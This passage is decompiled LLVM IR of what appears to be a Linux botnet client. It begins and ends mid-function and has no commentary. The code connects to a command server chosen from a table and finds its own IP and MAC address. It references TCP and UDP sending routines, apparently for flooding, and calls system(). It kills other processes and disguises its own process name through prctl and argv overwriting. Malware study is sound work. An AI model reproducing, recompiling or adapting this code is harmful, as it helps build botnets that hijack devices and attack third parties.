  %v2_805e86a = load i32, i32* %v1_805e854, align 4
  store i32 %v2_805e86a, i32* @ebx, align 4
  %v0_805e86c = call i32 @__getpid()
  %v0_805e871 = load i32, i32* @ebx, align 4
  %v12_805e871 = icmp eq i32 %v0_805e871, %v0_805e86c
  br i1 %v12_805e871, label %dec_label_pc_805e89b, label %dec_label_pc_805e875

dec_label_pc_805e875:                             ; preds = %dec_label_pc_805e85a
  %v0_805e87d = load i32, i32* @global_var_8078874.36, align 4
  %v2_805e882 = add i32 %v0_805e87d, %v2_805e847
  %v1_805e885 = inttoptr i32 %v2_805e882 to i32*
  %v2_805e885 = load i32, i32* %v1_805e885, align 4
  %v4_805e88f = inttoptr i32 %v2_805e885 to i8*
  store i8* %v4_805e88f, i8** %stack_var_-188, align 4
  %v4_805e892 = call i32 @kill(i32 %v2_805e885, i32 9)
  %v4_805e897 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_805e89b

dec_label_pc_805e89b:                             ; preds = %dec_label_pc_805e85a, %dec_label_pc_805e844, %dec_label_pc_805e875
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805e844 ], [ %stack_var_-28.1, %dec_label_pc_805e85a ], [ %v4_805e897, %dec_label_pc_805e875 ]
  %v4_805e89b = add i32 %storemerge, 1
  br label %dec_label_pc_805e89f

dec_label_pc_805e89f:                             ; preds = %dec_label_pc_805e817, %dec_label_pc_805e89b
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_805e89b ], [ 0, %dec_label_pc_805e817 ]
  %storemerge = phi i32 [ %v4_805e89b, %dec_label_pc_805e89b ], [ 0, %dec_label_pc_805e817 ]
  %v0_805e8b2 = load i32, i32* @global_var_8071b4c.35, align 4
  %v10_805e8c1 = icmp eq i32 %v0_805e8b2, 0
  br i1 %v10_805e8c1, label %dec_label_pc_805e8ca, label %dec_label_pc_805e844

dec_label_pc_805e8ca:                             ; preds = %dec_label_pc_805e89f
  %v0_805e8ad = load i32, i32* @global_var_8071b48.34, align 8
  %v10_805e8d5 = icmp ult i32 %storemerge, %v0_805e8ad
  br i1 %v10_805e8d5, label %dec_label_pc_805e844, label %dec_label_pc_805e8de

dec_label_pc_805e8de:                             ; preds = %dec_label_pc_805e8ca, %dec_label_pc_805e817
  %v2_805e8e1 = load i32, i32* %arg2, align 4
  store i32 %v2_805e8e1, i32* @eax, align 4
  %v4_805e8eb = inttoptr i32 %v2_805e8e1 to i8*
  store i8* %v4_805e8eb, i8** %stack_var_-188, align 4
  %v5_805e8ee = call i32 @__GI_strcoll(i8* %v4_805e8eb, i32 ptrtoint ([12 x i8]* @global_var_806e7fe.1532 to i32))
  %v1_805e8f3 = icmp eq i32 %v5_805e8ee, 0
  %v1_805e8f5 = icmp eq i1 %v1_805e8f3, false
  br i1 %v1_805e8f5, label %dec_label_pc_805e903, label %dec_label_pc_805e8f7

dec_label_pc_805e8f7:                             ; preds = %dec_label_pc_805e8de
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e8fe = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_805e903

dec_label_pc_805e903:                             ; preds = %dec_label_pc_805e663, %dec_label_pc_805e4bc, %dec_label_pc_805e16b, %dec_label_pc_805e5d1, %dec_label_pc_805e49a, %dec_label_pc_805e301, %dec_label_pc_805e0c3, %dec_label_pc_805e8de, %dec_label_pc_805e7c9, %dec_label_pc_805e645, %dec_label_pc_805e626, %dec_label_pc_805e60d, %dec_label_pc_805e5f4, %dec_label_pc_805e5db, %dec_label_pc_805e582, %dec_label_pc_805e4a4, %dec_label_pc_805e3f5, %dec_label_pc_805e29d, %dec_label_pc_805e14c, %dec_label_pc_805e131, %dec_label_pc_805e118, %dec_label_pc_805e0ff, %dec_label_pc_805e0e6, %dec_label_pc_805e0cd, %dec_label_pc_805e063, %dec_label_pc_805e006, %dec_label_pc_805e07e, %dec_label_pc_805dfd0, %dec_label_pc_805ddd6, %dec_label_pc_805dd87, %dec_label_pc_805dd54, %dec_label_pc_805e8f7
  %v0_805e90d = phi i32 [ %v2_805e66e, %dec_label_pc_805e663 ], [ %v2_805e4c7, %dec_label_pc_805e4bc ], [ %v2_805e176, %dec_label_pc_805e16b ], [ %v5_805e5c4, %dec_label_pc_805e5d1 ], [ %v5_805e48d, %dec_label_pc_805e49a ], [ %v5_805e2f4, %dec_label_pc_805e301 ], [ %v5_805e0b6, %dec_label_pc_805e0c3 ], [ %v5_805e8ee, %dec_label_pc_805e8de ], [ %v0_805e7c9, %dec_label_pc_805e7c9 ], [ %v2_805e650, %dec_label_pc_805e645 ], [ %v2_805e631, %dec_label_pc_805e626 ], [ %v2_805e618, %dec_label_pc_805e60d ], [ %v2_805e5ff, %dec_label_pc_805e5f4 ], [ %v2_805e5e6, %dec_label_pc_805e5db ], [ %v0_805e582, %dec_label_pc_805e582 ], [ %v2_805e4af, %dec_label_pc_805e4a4 ], [ %v0_805e3f5, %dec_label_pc_805e3f5 ], [ %v0_805e29d, %dec_label_pc_805e29d ], [ %v2_805e157, %dec_label_pc_805e14c ], [ %v2_805e13c, %dec_label_pc_805e131 ], [ %v2_805e123, %dec_label_pc_805e118 ], [ %v2_805e10a, %dec_label_pc_805e0ff ], [ %v2_805e0f1, %dec_label_pc_805e0e6 ], [ %v2_805e0d8, %dec_label_pc_805e0cd ], [ %v0_805e063, %dec_label_pc_805e063 ], [ 0, %dec_label_pc_805e006 ], [ %v2_805e070, %dec_label_pc_805e07e ], [ %v4_805dfe0, %dec_label_pc_805dfd0 ], [ %v4_805dde6, %dec_label_pc_805ddd6 ], [ %v4_805dda9, %dec_label_pc_805dd87 ], [ %v4_805dd64, %dec_label_pc_805dd54 ], [ %v2_805e8fe, %dec_label_pc_805e8f7 ]
  %v2_805e909 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805e909, i32* @ebx, align 4
  store i32 %v0_805dd33, i32* @esi, align 4
  store i32 %v0_805dd32, i32* @edi, align 4
  ret i32 %v0_805e90d

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_805e847, { 1, 0 }
  uselistorder i32 %v4_805e7b9, { 1, 0 }
  uselistorder i8* %v4_805e738, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0, 2 }
  uselistorder i32 %v2_805e6c6, { 1, 0 }
  uselistorder i32 %v2_805e6b8, { 1, 0 }
  uselistorder i32 %v2_805e6a5, { 1, 0 }
  uselistorder i32 %v2_805e692, { 1, 0 }
  uselistorder i32 %v2_805e682, { 1, 0, 2 }
  uselistorder i32 %v1_805e636, { 1, 0 }
  uselistorder i32 %v2_805e631, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805e618, { 1, 0 }
  uselistorder i32 %v2_805e5ff, { 1, 0 }
  uselistorder i32 %v2_805e5e6, { 1, 0 }
  uselistorder i8* %v4_805e511, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805e4fe, { 1, 0 }
  uselistorder i32 %v2_805e4eb, { 1, 0 }
  uselistorder i32 %v2_805e4db, { 1, 0, 2 }
  uselistorder i32* %v1_805e311, { 2, 0, 1, 3 }
  uselistorder i32 %v4_805e28d, { 1, 0 }
  uselistorder i8* %v4_805e217, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_805e1d3, { 1, 0 }
  uselistorder i32 %v2_805e1c0, { 1, 0 }
  uselistorder i32 %v2_805e1ad, { 1, 0 }
  uselistorder i32 %v2_805e19a, { 1, 0 }
  uselistorder i32 %v2_805e18a, { 1, 0, 2 }
  uselistorder i32 %v1_805e15c, { 1, 0 }
  uselistorder i32 %v2_805e157, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805e141, { 1, 0 }
  uselistorder i32 %v2_805e13c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805e123, { 1, 0 }
  uselistorder i32 %v2_805e10a, { 1, 0 }
  uselistorder i32 %v2_805e0f1, { 1, 0 }
  uselistorder i32 %v2_805e0d8, { 1, 0 }
  uselistorder i32 %v0_805e006, { 1, 0, 2 }
  uselistorder i8** %stack_var_-188, { 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 104, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp86, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32), { 3, 4, 2, 5, 1, 6, 0, 7, 8, 9 }
  uselistorder [39 x i8]* @global_var_806e770.1516, { 1, 0 }
  uselistorder [40 x i8]* @global_var_806e744.1514, { 1, 0 }
  uselistorder [39 x i8]* @global_var_806e700.1511, { 1, 0 }
  uselistorder [122 x i8]* @global_var_806e670.1508, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [16 x i8]* @global_var_806e656.1506, { 1, 0 }
  uselistorder i32 %arg1, { 0, 8, 7, 6, 5, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_805e903, { 31, 7, 8, 0, 9, 10, 11, 12, 13, 3, 14, 1, 15, 4, 16, 5, 17, 2, 18, 19, 20, 21, 22, 23, 6, 26, 24, 25, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_805e89f, { 1, 0 }
  uselistorder label %dec_label_pc_805e89b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e844, { 1, 0 }
  uselistorder label %dec_label_pc_805e817, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e7aa, { 1, 0 }
  uselistorder label %dec_label_pc_805e760, { 1, 0 }
  uselistorder label %dec_label_pc_805e724, { 1, 0 }
  uselistorder label %dec_label_pc_805e6f3, { 1, 0 }
  uselistorder label %dec_label_pc_805e65d, { 1, 0 }
  uselistorder label %dec_label_pc_805e5b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e563, { 1, 0 }
  uselistorder label %dec_label_pc_805e535, { 1, 0 }
  uselistorder label %dec_label_pc_805e47d, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e3cf, { 1, 0 }
  uselistorder label %dec_label_pc_805e34b, { 1, 0 }
  uselistorder label %dec_label_pc_805e2e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e27e, { 1, 0 }
  uselistorder label %dec_label_pc_805e23b, { 1, 0 }
  uselistorder label %dec_label_pc_805e203, { 1, 0 }
  uselistorder label %dec_label_pc_805e0a6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e047, { 1, 0 }
  uselistorder label %dec_label_pc_805dfad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805df65, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805df18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dedb, { 1, 0 }
  uselistorder label %dec_label_pc_805de9e, { 1, 0 }
  uselistorder label %dec_label_pc_805de61, { 1, 0 }
  uselistorder label %dec_label_pc_805de24, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805e90e = load i32, i32* @ebp, align 4
  store i32 %v0_805e90e, i32* %stack_var_-4, align 4
  %v4_805e90e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805e90e, i32* @ebp, align 4
  %v2_805e927 = ptrtoint i32* %stack_var_-4104 to i32
  %tmp11 = bitcast i32* %stack_var_-4104 to i8*
  %v5_805e930 = call i32 @__GI_memset(i8* %tmp11, i32 0, i32 4096)
  %v0_805e935 = load i8*, i8** @global_var_8071b40.30, align 4
  %v1_805e935 = ptrtoint i8* %v0_805e935 to i32
  %v2_805e93a = icmp eq i8* %v0_805e935, null
  br i1 %v2_805e93a, label %dec_label_pc_805e955, label %dec_label_pc_805e93e

dec_label_pc_805e93e:                             ; preds = %entry
  store i32 %v1_805e935, i32* @eax, align 4
  %v2_805e946 = call i32 @__GI___libc_close(i32 %v1_805e935)
  store i8* null, i8** @global_var_8071b40.30, align 64
  br label %dec_label_pc_805e955

dec_label_pc_805e955:                             ; preds = %entry, %dec_label_pc_805e93e
  %v0_805e955 = load i32, i32* @global_var_80718f0.1533, align 16
  %v1_805e95a = icmp eq i32 %v0_805e955, 0
  %v1_805e95c = icmp eq i1 %v1_805e95a, false
  br i1 %v1_805e95c, label %dec_label_pc_805e96a, label %dec_label_pc_805e977

dec_label_pc_805e96a:                             ; preds = %dec_label_pc_805e955
  %v1_805e96f = add i32 %v0_805e955, 1
  br label %dec_label_pc_805e977

dec_label_pc_805e977:                             ; preds = %dec_label_pc_805e955, %dec_label_pc_805e96a
  %storemerge = phi i32 [ %v1_805e96f, %dec_label_pc_805e96a ], [ 0, %dec_label_pc_805e955 ]
  store i32 %storemerge, i32* @global_var_80718f0.1533, align 16
  %v1_805e97c = mul i32 %storemerge, 4
  %v2_805e97c = add i32 %v1_805e97c, ptrtoint ([18 x i8]** @global_var_8071840.1535 to i32)
  %v3_805e97c = inttoptr i32 %v2_805e97c to i32*
  %v4_805e97c = load i32, i32* %v3_805e97c, align 4
  store i32 %v4_805e97c, i32* @eax, align 4
  %v4_805e990 = call i32 @strcpy(i8* %tmp11, i32 %v4_805e97c)
  %v4_805e9ad = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_805e9b2 = icmp eq i32 %v4_805e9ad, 0
  br i1 %v1_805e9b2, label %dec_label_pc_805e9f3, label %dec_label_pc_805e9b6

dec_label_pc_805e9b6:                             ; preds = %dec_label_pc_805e977
  %v4_805e9c7 = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v1_805e9cc = add i32 %v4_805e9c7, 1
  %v2_805e9d2 = call i32 @atol(i32 %v1_805e9cc)
  %v4_805e9eb = call i32 @__GI_strchr(i8* %tmp11, i32 58)
  %v5_805e9eb = inttoptr i32 %v4_805e9eb to i8*
  store i8 0, i8* %v5_805e9eb, align 1
  br label %dec_label_pc_805e9f3

dec_label_pc_805e9f3:                             ; preds = %dec_label_pc_805e977, %dec_label_pc_805e9b6
  %stack_var_-8.0 = phi i32 [ ptrtoint (i32* @global_var_8071844.1536 to i32), %dec_label_pc_805e977 ], [ %v2_805e9d2, %dec_label_pc_805e9b6 ]
  %v4_805ea0a = call i32 @socket(i32 2)
  %v1_805ea0f = inttoptr i32 %v4_805ea0a to i8*
  store i8* %v1_805ea0f, i8** @global_var_8071b40.30, align 64
  %v5_805ea36 = call i32 @connectTimeout(i32 %v4_805ea0a, i32 %v2_805e927, i32 %stack_var_-8.0, i32 30)
  %v1_805ea3b = icmp eq i32 %v5_805ea36, 0
  %. = zext i1 %v1_805ea3b to i32
  %v2_805ea5b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ea5b, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_805e935, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805e9f3, { 1, 0 }
  uselistorder label %dec_label_pc_805e977, { 1, 0 }
  uselistorder label %dec_label_pc_805e955, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805ea5d = load i32, i32* @ebp, align 4
  store i32 %v0_805ea5d, i32* %stack_var_-4, align 4
  %v5_805ea7d = call i32 @socket(i32 2)
  %v13_805ea85 = icmp eq i32 %v5_805ea7d, -1
  %v1_805ea89 = icmp eq i1 %v13_805ea85, false
  br i1 %v1_805ea89, label %dec_label_pc_805ea9a, label %dec_label_pc_805ec71

dec_label_pc_805ea9a:                             ; preds = %entry
  %v2_805eaaa = ptrtoint i32* %stack_var_-40 to i32
  %tmp30 = bitcast i32* %stack_var_-40 to i8*
  %v6_805eab0 = call i32 @__GI_memset(i8* %tmp30, i32 0, i32 16)
  store i32 2, i32* %stack_var_-40, align 4
  %v2_805eac2 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_806e80a.1537 to i32))
  %v3_805ead1 = call i32 @__GI_htons(i16 53)
  %v5_805eaef = call i32 @__libc_connect(i32 %v5_805ea7d, i32 %v2_805eaaa, i32 16)
  %v13_805eaf7 = icmp eq i32 %v5_805eaef, -1
  %v1_805eafb = icmp eq i1 %v13_805eaf7, false
  br i1 %v1_805eafb, label %dec_label_pc_805eb0c, label %dec_label_pc_805ec71

dec_label_pc_805eb0c:                             ; preds = %dec_label_pc_805ea9a
  store i32 16, i32* %stack_var_-60, align 4
  %v2_805eb13 = ptrtoint i32* %stack_var_-56 to i32
  %v2_805eb16 = ptrtoint i32* %stack_var_-60 to i32
  %v5_805eb27 = call i32 @__GI_getsockname(i32 %v5_805ea7d, i32 %v2_805eb13, i32 %v2_805eb16)
  %v13_805eb2f = icmp eq i32 %v5_805eb27, -1
  %v1_805eb33 = icmp eq i1 %v13_805eb2f, false
  br i1 %v1_805eb33, label %dec_label_pc_805eb44, label %dec_label_pc_805ec71

dec_label_pc_805eb44:                             ; preds = %dec_label_pc_805eb0c
  store i32 %tmp13, i32* @eax, align 4
  store i32 %tmp13, i32* @global_var_8078864.1307, align 4
  %v4_805eb5b = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_806e812.1538 to i32), i32 0)
  %v2_805ebbe = ptrtoint i8* %stack_var_-4156 to i32
  %v5_805ebd645 = call i32 @fdgets(i32 %v2_805ebbe, i32 4096, i32 %v4_805eb5b)
  %v1_805ebdb46 = icmp eq i32 %v5_805ebd645, 0
  %v1_805ebdd48 = icmp eq i1 %v1_805ebdb46, false
  br i1 %v1_805ebdd48, label %dec_label_pc_805eb65, label %dec_label_pc_805ebdf

dec_label_pc_805eb65:                             ; preds = %dec_label_pc_805eb44, %dec_label_pc_805eba0
  store i32 %v2_805ebbe, i32* @eax, align 4
  %v5_805eb76 = call i32 @strstr(i32 %v2_805ebbe, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806e822.1539, i32 0, i32 0))
  %v1_805eb7b = icmp eq i32 %v5_805eb76, 0
  br i1 %v1_805eb7b, label %dec_label_pc_805eba0, label %dec_label_pc_805eb8e.preheader

dec_label_pc_805eb8e.preheader:                   ; preds = %dec_label_pc_805eb65
  %v2_805eb9134 = load i8, i8* %stack_var_-4156, align 1
  %v10_805eb9440 = icmp eq i8 %v2_805eb9134, 9
  %v1_805eb9642 = icmp eq i1 %v10_805eb9440, false
  br i1 %v1_805eb9642, label %dec_label_pc_805eb8a, label %dec_label_pc_805eb98

dec_label_pc_805eb8a:                             ; preds = %dec_label_pc_805eb8e.preheader, %dec_label_pc_805eb8a
  %v4_805eb8e43 = phi i32 [ %v5_805eb8a, %dec_label_pc_805eb8a ], [ %v2_805ebbe, %dec_label_pc_805eb8e.preheader ]
  %v5_805eb8a = add i32 %v4_805eb8e43, 1
  %v23_805eb8a = inttoptr i32 %v5_805eb8a to i8*
  %v2_805eb91 = load i8, i8* %v23_805eb8a, align 1
  %v10_805eb94 = icmp eq i8 %v2_805eb91, 9
  %v1_805eb96 = icmp eq i1 %v10_805eb94, false
  br i1 %v1_805eb96, label %dec_label_pc_805eb8a, label %dec_label_pc_805eb98

dec_label_pc_805eb98:                             ; preds = %dec_label_pc_805eb8a, %dec_label_pc_805eb8e.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_805eb8e.preheader ], [ %v23_805eb8a, %dec_label_pc_805eb8a ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_805ebdf

dec_label_pc_805eba0:                             ; preds = %dec_label_pc_805eb65
  %v6_805ebb9 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_805ebd6 = call i32 @fdgets(i32 %v2_805ebbe, i32 4096, i32 %v4_805eb5b)
  %v1_805ebdb = icmp eq i32 %v5_805ebd6, 0
  %v1_805ebdd = icmp eq i1 %v1_805ebdb, false
  br i1 %v1_805ebdd, label %dec_label_pc_805eb65, label %dec_label_pc_805ebdf

dec_label_pc_805ebdf:                             ; preds = %dec_label_pc_805eb44, %dec_label_pc_805eba0, %dec_label_pc_805eb98
  store i32 %v4_805eb5b, i32* @eax, align 4
  %v2_805ebe5 = call i32 @__GI___libc_close(i32 %v4_805eb5b)
  %v3_805ebea = load i8, i8* %stack_var_-4156, align 1
  %v4_805ebf1 = icmp eq i8 %v3_805ebea, 0
  br i1 %v4_805ebf1, label %dec_label_pc_805ec58, label %dec_label_pc_805ebf5

dec_label_pc_805ebf5:                             ; preds = %dec_label_pc_805ebdf
  %v2_805ebff = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_805ebff, i32* @eax, align 4
  %tmp31 = bitcast i32* %stack_var_-4188 to i8*
  %v5_805ec08 = call i32 @strcpy(i8* %tmp31, i32 %v2_805ebbe)
  %v5_805ec25 = call i32 @ioctl(i32 %v5_805ea7d, i32 35111, i32 %v2_805ebff)
  %v2_805ec3c = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_805ec33

dec_label_pc_805ec33:                             ; preds = %dec_label_pc_805ebf5, %dec_label_pc_805ec33
  %storemerge32 = phi i32 [ 0, %dec_label_pc_805ebf5 ], [ %v4_805ec4e, %dec_label_pc_805ec33 ]
  %v2_805ec42 = add i32 %storemerge32, %v2_805ec3c
  %v1_805ec45 = inttoptr i32 %v2_805ec42 to i8*
  %v2_805ec45 = load i8, i8* %v1_805ec45, align 1
  %v3_805ec48 = add i32 %storemerge32, ptrtoint (i8** @global_var_8071b50.1540 to i32)
  %v4_805ec48 = inttoptr i32 %v3_805ec48 to i8*
  store i8 %v2_805ec45, i8* %v4_805ec48, align 1
  %v4_805ec4e = add nuw nsw i32 %storemerge32, 1
  %exitcond = icmp eq i32 %v4_805ec4e, 6
  br i1 %exitcond, label %dec_label_pc_805ec58, label %dec_label_pc_805ec33

dec_label_pc_805ec58:                             ; preds = %dec_label_pc_805ec33, %dec_label_pc_805ebdf
  store i32 %v5_805ea7d, i32* @eax, align 4
  %v2_805ec5e = call i32 @__GI___libc_close(i32 %v5_805ea7d)
  br label %dec_label_pc_805ec71

dec_label_pc_805ec71:                             ; preds = %entry, %dec_label_pc_805ea9a, %dec_label_pc_805eb0c, %dec_label_pc_805ec58
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_805ec58 ], [ 0, %dec_label_pc_805eb0c ], [ 0, %dec_label_pc_805ea9a ], [ 0, %entry ]
  %v2_805ec77 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ec77, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i32 %v5_805eb8a, { 1, 0 }
  uselistorder i32 %v2_805ebbe, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v4_805eb5b, { 2, 1, 3, 0 }
  uselistorder i32 %v5_805ea7d, { 3, 2, 1, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp13, { 1, 0 }
  uselistorder i32 (i16)* @__GI_htons, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805ec71, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805ec33, { 1, 0 }
  uselistorder label %dec_label_pc_805ebdf, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805eb8a, { 1, 0 }
  uselistorder label %dec_label_pc_805eb65, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_805ec79 = load i32, i32* @ebp, align 4
  %v3_805ec8e = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_806e82d.1541 to i32), i32 0)
  %v10_805ec93 = icmp eq i32 %v3_805ec8e, -1
  %v4_805eca8 = select i1 %v10_805ec93, i32 ptrtoint ([7 x i8]* @global_var_806e844.1543 to i32), i32 ptrtoint ([7 x i8]* @global_var_806e83d.1542 to i32)
  store i32 %v0_805ec79, i32* @ebp, align 4
  ret i32 %v4_805eca8
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-36896 = alloca i32, align 4
  %stack_var_-4220 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-36976 = alloca i8*, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_805ecad = ptrtoint i32* %stack_var_4 to i32
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_806e82d.1541, i32 0, i32 0), i8** %stack_var_-36976, align 4
  %v4_805ecde = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_806e82d.1541 to i32), i32 0)
  %v10_805ece3 = icmp eq i32 %v4_805ecde, -1
  %. = select i1 %v10_805ece3, i32 ptrtoint ([19 x i8]* @global_var_806e851.1546 to i32), i32 ptrtoint ([5 x i8]* @global_var_806e84c.1545 to i32)
  %v0_805ecf8 = call i32 @geteuid()
  %v1_805ecfd = icmp eq i32 %v0_805ecf8, 0
  %v1_805ecff = icmp eq i1 %v1_805ecfd, false
  br i1 %v1_805ecff, label %dec_label_pc_805ed0b, label %dec_label_pc_805ed01

dec_label_pc_805ed01:                             ; preds = %entry
  store i32 0, i32* @global_var_80718ec.1547, align 4
  br label %dec_label_pc_805ed0b

dec_label_pc_805ed0b:                             ; preds = %entry, %dec_label_pc_805ed01
  %v0_805ed0b = call i32 @getBuild()
  %v0_805ed13 = load i32, i32* @global_var_8078864.1307, align 4
  %v4_805ed18 = inttoptr i32 %v0_805ed13 to i8*
  store i8* %v4_805ed18, i8** %stack_var_-36976, align 4
  %v2_805ed1b = call i32 @__GI_inet_ntoa(i32 %v0_805ed13)
  store i32 %v2_805ed1b, i32* @ebx, align 4
  %v0_805ed22 = call i32 @getBuild()
  %v0_805ed27 = load i32, i32* @ebx, align 4
  %v5_805ed27 = inttoptr i32 %v0_805ed27 to i8*
  %v5_805ed2b = inttoptr i32 %v0_805ed22 to i8*
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e864.1548, i32 0, i32 0), i8** %stack_var_-36976, align 4
  %v9_805ed36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e864.1548, i32 0, i32 0), i8* %v5_805ed2b, i8* %v5_805ed27)
  %v1_805ed41 = add i32 %v2_805ecad, 4
  %v2_805ed41 = inttoptr i32 %v1_805ed41 to i32*
  %v3_805ed41 = load i32, i32* %v2_805ed41, align 4
  %v1_805ed44 = inttoptr i32 %v3_805ed41 to i32*
  %v2_805ed44 = load i32, i32* %v1_805ed44, align 4
  %v4_805ed46 = inttoptr i32 %v2_805ed44 to i8*
  store i8* %v4_805ed46, i8** %stack_var_-36976, align 4
  %v3_805ed49 = call i32 @strlen(i8* %v4_805ed46)
  %v3_805ed56 = load i32, i32* %v2_805ed41, align 4
  %v1_805ed59 = inttoptr i32 %v3_805ed56 to i32*
  %v2_805ed59 = load i32, i32* %v1_805ed59, align 4
  %v4_805ed67 = inttoptr i32 %v2_805ed59 to i8*
  store i8* %v4_805ed67, i8** %stack_var_-36976, align 4
  %v7_805ed6a = call i32 @strncpy(i8* %v4_805ed67, i32 ptrtoint (i32* @global_var_806e84b.1544 to i32), i32 %v3_805ed49)
  %v3_805ed75 = load i32, i32* %v2_805ed41, align 4
  %v1_805ed78 = inttoptr i32 %v3_805ed75 to i32*
  %v2_805ed78 = load i32, i32* %v1_805ed78, align 4
  %v4_805ed83 = inttoptr i32 %v2_805ed78 to i8*
  store i8* %v4_805ed83, i8** %stack_var_-36976, align 4
  %v4_805ed86 = call i32 @sprintf(i32 %v2_805ed78, i32 %.)
  store i8* inttoptr (i32 15 to i8*), i8** %stack_var_-36976, align 4
  %v9_805edb1 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  store i8* null, i8** %stack_var_-36976, align 4
  %v3_805edbd = call i32 @__GI_time(i32* null)
  store i32 %v3_805edbd, i32* @ebx, align 4
  %v0_805edc4 = call i32 @__getpid()
  %v1_805edc9 = load i32, i32* @ebx, align 4
